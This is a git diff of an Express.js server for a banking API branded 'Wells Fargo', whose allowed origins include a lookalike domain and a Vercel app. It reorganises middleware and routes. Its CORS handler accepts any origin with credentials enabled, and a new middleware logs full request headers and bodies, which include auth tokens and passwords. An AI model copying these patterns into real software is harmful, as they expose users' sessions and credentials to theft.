@@ -5,7 +5,7 @@ const cors = require('cors');
 const mongoose = require('mongoose');
 const errorHandler = require('./Middleware/errorMiddleware');
 
-// Load env vars
+// Load env vars FIRST
 dotenv.config();
 
 // Check for essential environment variables
@@ -14,7 +14,99 @@ if (!process.env.MONGODB_URI) {
   process.exit(1);
 }
 
-// Route files
+const app = express();
+
+// ============================================
+// MIDDLEWARE - ORDER IS CRITICAL!
+// ============================================
+
+// 1. Body parser - MUST BE FIRST
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
+
+// 2. Logging
+if (process.env.NODE_ENV === 'development') {
+  app.use(morgan('dev'));
+}
+
+// 3. CORS - Must be before routes
+const allowedOrigins = [
+  'https://wellsfargoca.net',
+  'https://www.wellsfargoca.net',
+  'https://wells-fargo-seven.vercel.app',
+  'http://localhost:3000',
+  'http://localhost:5173',
+  'http://127.0.0.1:3000',
+  'http://127.0.0.1:5173'
+];
+
+if (process.env.CORS_ORIGIN) {
+  const envOrigins = process.env.CORS_ORIGIN.split(',').map(origin => origin.trim());
+  envOrigins.forEach(origin => {
+    if (!allowedOrigins.includes(origin)) {
+      allowedOrigins.push(origin);
+    }
+  });
+}
+
+console.log('🔐 CORS allowed origins:', allowedOrigins);
+
+const corsOptions = {
+  origin: function(origin, callback) {
+    // Allow requests with no origin (Postman, mobile apps, curl)
+    if (!origin) {
+      console.log('✅ Request with no origin - allowed');
+      return callback(null, true);
+    }
+    
+    if (allowedOrigins.includes(origin)) {
+      console.log('✅ Origin allowed:', origin);
+      callback(null, true);
+    } else {
+      console.log('⚠️  Origin not in whitelist (allowing anyway):', origin);
+      callback(null, true); // Allow for testing - change to callback(new Error('Not allowed by CORS')) in production
+    }
+  },
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
+  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin'],
+  exposedHeaders: ['Content-Length', 'X-JSON'],
+  maxAge: 86400, // 24 hours
+  preflightContinue: false,
+  optionsSuccessStatus: 204
+};
+
+app.use(cors(corsOptions));
+
+// Handle preflight requests explicitly
+app.options('*', cors(corsOptions), (req, res) => {
+  console.log('✈️  Preflight request for:', req.path);
+  res.sendStatus(204);
+});
+
+// 4. Custom middleware for logging all requests
+app.use((req, res, next) => {
+  console.log(`\n📨 ${req.method} ${req.originalUrl}`);
+  console.log('Headers:', JSON.stringify(req.headers, null, 2));
+  if (req.body && Object.keys(req.body).length > 0) {
+    console.log('Body:', JSON.stringify(req.body, null, 2));
+  }
+  next();
+});
+
+// 5. Name middleware for registration
+app.use('/api/auth/register', (req, res, next) => {
+  if (req.body.firstName && req.body.lastName) {
+    req.body.name = `${req.body.firstName} ${req.body.lastName}`;
+    console.log('Middleware added name:', req.body.name);
+  }
+  next();
+});
+
+// ============================================
+// ROUTES
+// ============================================
+
 const authRoutes = require('./Routes/authRoutes');
 const dashboardRoutes = require('./Routes/dashboardRoutes');
 const checkingRoutes = require('./Routes/checkingRoutes');
@@ -28,87 +120,19 @@ const depositRoutes = require('./Routes/depositRoutes');
 const checkDepositRoutes = require('./Routes/checkDepositRoutes');
 const newAccountOpenRoutes = require('./Routes/newAccountOpenRoutes');
 const withdrawalRoutes = require('./Routes/withdrawFundRoutes');
-const orderCheckRoutes = require('./Routes/orderCheckRoutes')
+const orderCheckRoutes = require('./Routes/orderCheckRoutes');
 const autopayRoutes = require('./Routes/autopayRoutes');
 const accountAlertRoutes = require('./Routes/accountAlertRoutes');
 const disputeTransactionRoutes = require('./Routes/disputeTransactionRoutes');
 const creditAccountRoutes = require('./Routes/creditAccountRoutes');
 const profileRoutes = require('./Routes/profileRoutes');
 
-const app = express();
-
-// Body parser - MUST BE BEFORE ROUTES
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
-
-// Dev logging middleware
-if (process.env.NODE_ENV === 'development') {
-  app.use(morgan('dev'));
-}
-
-// Build allowed origins list
-const allowedOrigins = [
-  'https://wellsfargoca.net',
-  'https://wells-fargo-seven.vercel.app',
-  'http://localhost:3000',
-  'http://localhost:5173'
-];
-
-// Add additional origins from env if specified
-if (process.env.CORS_ORIGIN) {
-  const envOrigins = process.env.CORS_ORIGIN.split(',').map(origin => origin.trim());
-  envOrigins.forEach(origin => {
-    if (!allowedOrigins.includes(origin)) {
-      allowedOrigins.push(origin);
-    }
-  });
-}
-
-// Log CORS configuration for debugging
-console.log('CORS allowed origins:', allowedOrigins);
-
-// Enable CORS - MUST BE BEFORE ROUTES
-app.use(cors({
-  origin: function(origin, callback) {
-    // Allow requests with no origin (mobile apps, Postman, curl, etc.)
-    if (!origin) {
-      return callback(null, true);
-    }
-    
-    // Check if origin is in allowed list
-    if (allowedOrigins.includes(origin) || allowedOrigins.includes('*')) {
-      callback(null, true);
-    } else {
-      console.log('CORS origin not in whitelist:', origin);
-      // In production, you might want to allow anyway for now
-      callback(null, true); // Change to callback(new Error('Not allowed by CORS')) to block
-    }
-  },
-  credentials: true,
-  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
-  allowedHeaders: ['Content-Type', 'Authorization', 'x-auth-token', 'X-Requested-With'],
-  exposedHeaders: ['Content-Length', 'X-JSON'],
-  maxAge: 600 // Cache preflight for 10 minutes
-}));
-
-// Handle preflight requests - MUST BE BEFORE ROUTES
-app.options('*', cors());
-
-// Name middleware for registration
-app.use('/api/auth/register', (req, res, next) => {
-  if (req.body.firstName && req.body.lastName) {
-    req.body.name = `${req.body.firstName} ${req.body.lastName}`;
-    console.log('Middleware added name:', req.body.name);
-  }
-  next();
-});
-
 // Mount routers
 app.use('/api/auth', authRoutes);
 app.use('/api/dashboard', dashboardRoutes);
 app.use('/api/checking', checkingRoutes);
 app.use('/api/savings', savingsAccountRoutes);
-app.use('/api/transfers', transferRoutes);
+app.use('/api/transfers', transferRoutes); // ⭐ YOUR TRANSFER ROUTES
 app.use('/api/accounts', accountRoutes);
 app.use('/api/bills', billRoutes);
 app.use('/api/payees', payeeRoutes);
@@ -117,32 +141,55 @@ app.use('/api/deposits', depositRoutes);
 app.use('/api/check-deposits', checkDepositRoutes);
 app.use('/api', newAccountOpenRoutes);
 app.use('/api/withdrawals', withdrawalRoutes);
-app.use('/api/order-checks', orderCheckRoutes)
+app.use('/api/order-checks', orderCheckRoutes);
 app.use('/api/autopay', autopayRoutes);
 app.use('/api/account-alerts', accountAlertRoutes);
 app.use('/api/dispute-transactions', disputeTransactionRoutes);
 app.use('/api/credit-accounts', creditAccountRoutes);
 app.use('/api/profile', profileRoutes);
 
-// Health check route
+console.log('✅ All routes mounted successfully');
+
+// ============================================
+// HEALTH CHECK & ERROR HANDLERS
+// ============================================
+
+// Health check
 app.get('/', (req, res) => {
-  res.status(200).json({ success: true, message: 'API is running' });
+  res.status(200).json({ 
+    success: true, 
+    message: 'Wells Fargo API is running',
+    timestamp: new Date().toISOString()
+  });
 });
 
-// 404 handler for undefined routes
+// Test endpoint
+app.get('/api/test', (req, res) => {
+  res.status(200).json({ 
+    success: true, 
+    message: 'API test endpoint working',
+    env: process.env.NODE_ENV 
+  });
+});
+
+// 404 handler
 app.use((req, res, next) => {
+  console.log(`❌ 404 - Route not found: ${req.method} ${req.originalUrl}`);
   res.status(404).json({
     success: false,
     error: `Route ${req.method} ${req.originalUrl} not found`
   });
 });
 
-// Custom error handler - must be after routes
+// Error handler - must be last
 app.use(errorHandler);
+
+// ============================================
+// DATABASE CONNECTION & SERVER START
+// ============================================
 
 const PORT = process.env.PORT || 5000;
 
-// Connect to MongoDB with proper error handling
 mongoose
   .connect(process.env.MONGODB_URI, {
     useNewUrlParser: true,
@@ -151,23 +198,23 @@ mongoose
     minPoolSize: process.env.MONGODB_MIN_POOL_SIZE || 2
   })
   .then(() => {
-    console.log('MongoDB Connected');
-    // Start server after successful database connection
-    const server = app.listen(
-      PORT,
-      console.log(`Server running in ${process.env.NODE_ENV} mode on port ${PORT}`)
-    );
+    console.log('✅ MongoDB Connected');
+    
+    const server = app.listen(PORT, () => {
+      console.log(`\n🚀 Server running in ${process.env.NODE_ENV || 'development'} mode on port ${PORT}`);
+      console.log(`📍 API URL: http://localhost:${PORT}`);
+      console.log(`📍 Health check: http://localhost:${PORT}/api/test`);
+      console.log(`📍 Transfer endpoint: http://localhost:${PORT}/api/transfers/transfer\n`);
+    });
    
-    // Handle unhandled promise rejections
     process.on('unhandledRejection', (err, promise) => {
-      console.log(`Error: ${err.message}`);
-      // Close server & exit process
+      console.log(`❌ Error: ${err.message}`);
       server.close(() => process.exit(1));
     });
    
-    module.exports = server; // Export for testing purposes
+    module.exports = server;
   })
   .catch(err => {
-    console.error('MongoDB connection error:', err);
+    console.error('❌ MongoDB connection error:', err);
     process.exit(1);
   });
